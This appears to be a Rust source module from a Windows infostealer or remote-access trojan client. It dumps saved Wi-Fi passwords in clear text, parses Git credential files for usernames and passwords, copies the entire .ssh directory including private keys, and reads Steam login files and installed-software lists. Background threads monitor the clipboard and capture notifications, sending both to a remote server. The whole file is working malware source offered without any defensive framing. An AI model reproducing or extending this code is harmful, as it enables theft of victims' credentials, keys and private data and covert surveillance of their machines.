use std::collections::HashSet;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::ptr::null_mut;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

use regex::Regex;
use serde::Deserialize;
use winapi::shared::minwindef::HGLOBAL;
use winapi::um::winbase::{GlobalLock, GlobalUnlock};
use winapi::um::winuser::{CF_UNICODETEXT, CloseClipboard, GetClipboardData, OpenClipboard};
use winreg::HKEY;
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY, KEY_WOW64_64KEY};
use winreg::RegKey;
use wmi::{COMLibrary, WMIConnection};

use common::packets::{
    ClipboardUpdate,
    ExtractedFile,
    GitCredentialEntry,
    GitData,
    NotificationEvent,
    ServerboundPacket,
    SSHData,
    SoftwareEntry,
    SoftwareInventory,
    SteamAccountEntry,
    SteamData,
    WifiData,
    WifiProfile,
};
use crate::handler::send_packet_sync;

static CLIPBOARD_MONITOR_RUNNING: AtomicBool = AtomicBool::new(false);
static NOTIFICATION_CAPTURE_RUNNING: AtomicBool = AtomicBool::new(false);

pub fn collect_wifi_data() -> WifiData {
    let mut profiles = Vec::new();

    let output = std::process::Command::new("cmd")
        .args(["/C", "chcp 65001 >nul & netsh wlan show profiles"])
        .output();

    if let Ok(output) = output {
        if let Ok(text) = String::from_utf8(output.stdout) {
            let profile_re = Regex::new(r"All User Profile\s*:\s*(.*)").unwrap();
            for cap in profile_re.captures_iter(&text) {
                let ssid = cap.get(1).unwrap().as_str().trim().to_string();
                if ssid.is_empty() {
                    continue;
                }

                let output = std::process::Command::new("cmd")
                    .args(["/C", &format!("chcp 65001 >nul & netsh wlan show profile name=\"{}\" key=clear", ssid)])
                    .output();

                if let Ok(output) = output {
                    if let Ok(details) = String::from_utf8(output.stdout) {
                        let password = parse_key_content(&details).unwrap_or_else(|| "(not found)".to_string());
                        let auth = parse_line_value(&details, "Authentication") .unwrap_or_default();
                        let cipher = parse_line_value(&details, "Cipher") .unwrap_or_default();
                        profiles.push(WifiProfile {
                            ssid: ssid.clone(),
                            password,
                            authentication: auth,
                            cipher,
                        });
                    }
                }
            }
        }
    }

    WifiData { profiles }
}

fn parse_key_content(details: &str) -> Option<String> {
    parse_line_value(details, "Key Content")
        .or_else(|| parse_line_value(details, "Security key") .filter(|v| v != "Absent"))
}

fn parse_line_value(details: &str, field: &str) -> Option<String> {
    for line in details.lines() {
        if let Some(idx) = line.find(':') {
            let name = line[..idx].trim();
            if name.eq_ignore_ascii_case(field) {
                return Some(line[idx + 1..].trim().to_string());
            }
        }
    }
    None
}

pub fn collect_software_inventory() -> SoftwareInventory {
    let mut applications = Vec::new();
    let mut seen = HashSet::new();

    let roots = [
        (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", KEY_WOW64_64KEY),
        (HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", KEY_WOW64_32KEY),
        (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", KEY_WOW64_64KEY),
    ];

    for (root, subkey, flag) in roots {
        collect_installed_software(root, subkey, flag, &mut applications, &mut seen);
    }

    SoftwareInventory { applications }
}

fn collect_installed_software(
    root: HKEY,
    path: &str,
    access_flags: u32,
    applications: &mut Vec<SoftwareEntry>,
    seen: &mut HashSet<String>,
) {
    let base = RegKey::predef(root);
    if let Ok(key) = base.open_subkey_with_flags(path, KEY_READ | access_flags) {
        for subkey_name in key.enum_keys().flatten() {
            if let Ok(subkey) = key.open_subkey(&subkey_name) {
                let name: String = subkey.get_value("DisplayName").unwrap_or_default();
                if name.is_empty() {
                    continue;
                }
                let version: String = subkey.get_value("DisplayVersion").unwrap_or_default();
                let publisher: String = subkey.get_value("Publisher").unwrap_or_default();
                let install_location: String = subkey.get_value("InstallLocation").unwrap_or_default();
                let uninstall_command: String = subkey.get_value("UninstallString").unwrap_or_default();
                let signature = format!("{}|{}", name, version);
                if seen.insert(signature) {
                    applications.push(SoftwareEntry {
                        name,
                        version,
                        publisher,
                        install_location,
                        uninstall_command,
                    });
                }
            }
        }
    }
}

pub fn collect_git_data() -> GitData {
    let mut credentials = Vec::new();
    let mut configs = Vec::new();

    if let Some(home) = env::var("USERPROFILE").or_else(|_| env::var("HOME")) .ok() {
        let home = PathBuf::from(home);
        let git_creds = home.join(".git-credentials");
        if git_creds.exists() {
            if let Ok(text) = fs::read_to_string(&git_creds) {
                for line in text.lines().map(str::trim).filter(|line| !line.is_empty()) {
                    if let Some(entry) = parse_git_credential(line) {
                        credentials.push(GitCredentialEntry {
                            source: "git-credentials".to_string(),
                            path: git_creds.to_string_lossy().to_string(),
                            url: entry.0,
                            username: entry.1,
                            password: entry.2,
                            raw: line.to_string(),
                        });
                    }
                }
            }
        }

        let git_config = home.join(".gitconfig");
        if git_config.exists() {
            if let Ok(raw) = fs::read_to_string(&git_config) {
                configs.push(ExtractedFile {
                    path: git_config.to_string_lossy().to_string(),
                    contents: raw,
                });
            }
        }
    }

    GitData { credentials, configs }
}

fn parse_git_credential(line: &str) -> Option<(String, String, String)> {
    let url = line.trim();
    let stripped = if let Some(url) = url.strip_prefix("https://") {
        url
    } else if let Some(url) = url.strip_prefix("http://") {
        url
    } else {
        return None;
    };

    let host_part = stripped.rsplit_once('@')?.1;
    let auth_part = stripped.split_once('@')?.0;
    let url_value = format!("https://{}", host_part);

    let (username, password) = auth_part.split_once(':')?;
    Some((url_value, username.to_string(), password.to_string()))
}

pub fn collect_ssh_data() -> SSHData {
    let mut files = Vec::new();

    if let Some(home) = env::var("USERPROFILE").or_else(|_| env::var("HOME")).ok() {
        let ssh_dir = PathBuf::from(home).join(".ssh");
        collect_files_recursive(&ssh_dir, &mut files);
    }

    SSHData { files }
}

fn collect_files_recursive(path: &Path, results: &mut Vec<ExtractedFile>) {
    if !path.exists() {
        return;
    }

    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                let contents = fs::read_to_string(&path).unwrap_or_else(|_| {
                    fs::read(&path)
                        .map(|bytes| String::from_utf8_lossy(&bytes).to_string())
                        .unwrap_or_default()
                });
                results.push(ExtractedFile {
                    path: path.to_string_lossy().to_string(),
                    contents,
                });
            } else if path.is_dir() {
                collect_files_recursive(&path, results);
            }
        }
    }
}

pub fn collect_steam_data() -> SteamData {
    let mut accounts = Vec::new();
    let mut files = Vec::new();

    let paths = [
        env::var("PROGRAMFILES(X86)").ok(),
        env::var("PROGRAMFILES").ok(),
    ];

    for base in paths.iter().flatten() {
        let steam_dir = PathBuf::from(base).join("Steam");
        let login_file = steam_dir.join("config").join("loginusers.vdf");
        let registry_file = steam_dir.join("config").join("registry.vdf");

        if login_file.exists() {
            if let Ok(content) = fs::read_to_string(&login_file) {
                files.push(ExtractedFile {
                    path: login_file.to_string_lossy().to_string(),
                    contents: content.clone(),
                });
                parse_steam_logins(&content, &mut accounts);
            }
        }

        if registry_file.exists() {
            if let Ok(content) = fs::read_to_string(&registry_file) {
                files.push(ExtractedFile {
                    path: registry_file.to_string_lossy().to_string(),
                    contents: content,
                });
            }
        }
    }

    SteamData { accounts, files }
}

fn parse_steam_logins(content: &str, accounts: &mut Vec<SteamAccountEntry>) {
    let header_re = Regex::new(r#"^"(?P<id>\d+)"\s*\{"#).unwrap();
    let field_re = Regex::new(r#"^"(?P<key>[^"]+)"\s*"(?P<value>[^"]*)"#).unwrap();
    let mut current: Option<SteamAccountEntry> = None;

    for line in content.lines() {
        let line = line.trim();
        if let Some(caps) = header_re.captures(line) {
            if let Some(entry) = current.take() {
                accounts.push(entry);
            }
            current = Some(SteamAccountEntry {
                steam_id: caps["id"].to_string(),
                account_name: String::new(),
                persona_name: String::new(),
                remember_password: String::new(),
                last_logon: String::new(),
                details: String::new(),
            });
            continue;
        }

        if line == "}" {
            if let Some(entry) = current.take() {
                accounts.push(entry);
            }
            continue;
        }

        if let Some(caps) = field_re.captures(line) {
            if let Some(account) = current.as_mut() {
                let key = caps["key"].to_string();
                let value = caps["value"].to_string();
                account.details.push_str(&format!("{}={}\n", key, value));

                match key.as_str() {
                    "AccountName" => account.account_name = value,
                    "PersonaName" => account.persona_name = value,
                    "RememberPassword" => account.remember_password = value,
                    "MostRecent" => account.last_logon = value,
                    _ => {}
                }
            }
        }
    }

    if let Some(entry) = current.take() {
        accounts.push(entry);
    }
}

pub fn start_clipboard_monitor() {
    if CLIPBOARD_MONITOR_RUNNING.swap(true, Ordering::SeqCst) {
        return;
    }

    thread::spawn(|| {
        let mut last_text = String::new();

        while CLIPBOARD_MONITOR_RUNNING.load(Ordering::SeqCst) {
            if let Some(text) = get_clipboard_text() {
                if !text.is_empty() && text != last_text {
                    last_text = text.clone();
                    let _ = send_packet_sync(ServerboundPacket::ClipboardUpdate(ClipboardUpdate { text }));
                }
            }
            thread::sleep(Duration::from_secs(1));
        }
    });
}

pub fn stop_clipboard_monitor() {
    CLIPBOARD_MONITOR_RUNNING.store(false, Ordering::SeqCst);
}

fn get_clipboard_text() -> Option<String> {
    unsafe {
        if OpenClipboard(null_mut()) == 0 {
            return None;
        }
        let handle = GetClipboardData(CF_UNICODETEXT);
        if handle.is_null() {
            CloseClipboard();
            return None;
        }

        let locked = GlobalLock(handle as HGLOBAL);
        if locked.is_null() {
            CloseClipboard();
            return None;
        }

        let mut len = 0;
        while * (locked as *const u16).add(len) != 0 {
            len += 1;
        }

        let slice = std::slice::from_raw_parts(locked as *const u16, len);
        let message = String::from_utf16_lossy(slice);
        GlobalUnlock(handle as HGLOBAL);
        CloseClipboard();
        Some(message)
    }
}

pub fn start_notification_capture() {
    if NOTIFICATION_CAPTURE_RUNNING.swap(true, Ordering::SeqCst) {
        return;
    }

    thread::spawn(|| {
        let mut last_record: u32 = 0;

        while NOTIFICATION_CAPTURE_RUNNING.load(Ordering::SeqCst) {
            if let Ok(com_con) = COMLibrary::new() {
                if let Ok(wmi_con) = WMIConnection::new(com_con.into()) {
                    let query = format!(
                        "SELECT RecordNumber, SourceName, Message, TimeGenerated FROM Win32_NTLogEvent WHERE Logfile='Application' AND (SourceName LIKE '%ImmersiveShell%' OR SourceName LIKE '%ActionCenter%' OR SourceName LIKE '%TileData%' OR SourceName LIKE '%Windows.UI.Notifications%') AND RecordNumber > {}",
                        last_record
                    );

                    if let Ok(events) = wmi_con.raw_query::<Win32NTLogEvent>(&query) {
                        for event in events {
                            let record = event.record_number;
                            if record <= last_record {
                                continue;
                            }

                            last_record = record;
                            let source = event.source_name.unwrap_or_default();
                            let message = event.message.unwrap_or_default();
                            let timestamp = event.time_generated.unwrap_or_default();
                            let title = message.lines().next().unwrap_or_default().to_string();

                            let payload = NotificationEvent {
                                source,
                                title,
                                message,
                                timestamp,
                            };

                            let _ = send_packet_sync(ServerboundPacket::NotificationEvent(payload));
                        }
                    }
                }
            }

            thread::sleep(Duration::from_secs(5));
        }
    });
}

pub fn stop_notification_capture() {
    NOTIFICATION_CAPTURE_RUNNING.store(false, Ordering::SeqCst);
}

#[derive(Deserialize, Debug)]
#[serde(rename_all = "PascalCase")]
struct Win32NTLogEvent {
    record_number: u32,
    source_name: Option<String>,
    message: Option<String>,
    time_generated: Option<String>,
}
